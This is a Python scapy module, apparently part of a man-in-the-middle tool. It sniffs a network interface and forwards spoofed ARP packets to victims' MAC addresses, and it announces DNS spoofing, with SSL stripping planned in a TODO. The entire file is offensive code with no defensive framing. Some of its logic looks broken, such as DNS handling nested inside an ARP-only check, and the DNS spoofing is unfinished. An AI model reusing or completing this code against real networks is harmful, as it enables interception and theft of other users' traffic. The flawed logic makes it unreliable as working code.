from scapy import packet
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sendp, sniff
from scapy.arch import get_if_addr
import threading


class Forwarding(threading.Thread):

    def __init__(self, interface: str, hosts: dict):
        """
        Starts DNS spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param hosts: list of discovered hosts, used to forward to correct IP
        """
        super(Forwarding, self).__init__()
        self.interface = interface
        self.hosts = hosts
        self.host_ip = get_if_addr(interface)
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def forward(received_packet: packet) -> None:
            # Packet is a DNS request
            if ARP not in received_packet:
                return
            elif DNS in received_packet and received_packet[DNS].qr == 0:
                # TODO: check if packet should be forwarded and possible perform SSL stripping
                print("Received a DNS packet")
                return
            elif received_packet[ARP].pdst != self.host_ip:
                for mac in self.hosts[self.interface]:
                    for ip in self.hosts[self.interface][mac]:
                        if ip == received_packet[ARP].pdst:
                            received_packet[ARP].dst = mac
                sendp(received_packet, iface=self.interface, verbose=False)
            else:
                print("Something went wrong!")
                received_packet.show()

        print("Now forwarding spoofed ARP and DNS packets...")
        while True:
            if self.is_stopped():
                print("Stopped forwarding spoofed ARP and DNS packets")
                return
            sniff(iface=self.interface, prn=forward, store=0, timeout=1)
